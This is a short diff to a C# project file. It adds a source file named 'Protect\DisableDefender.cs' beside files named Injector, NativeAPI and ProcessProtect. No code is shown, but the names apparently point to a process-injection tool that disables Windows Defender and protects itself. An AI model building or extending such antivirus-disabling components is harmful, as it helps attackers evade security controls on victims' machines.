@@ -45,6 +45,7 @@
     <Compile Include="Injector\Injector.cs" />
     <Compile Include="Injector\NativeAPI.cs" />
     <Compile Include="Properties\AssemblyInfo.cs" />
+    <Compile Include="Protect\DisableDefender.cs" />
     <Compile Include="Protect\ProcessProtect.cs" />
   </ItemGroup>
   <Import Project="$(MSBuildToolsPath)\Microsoft.CSharp.targets" />
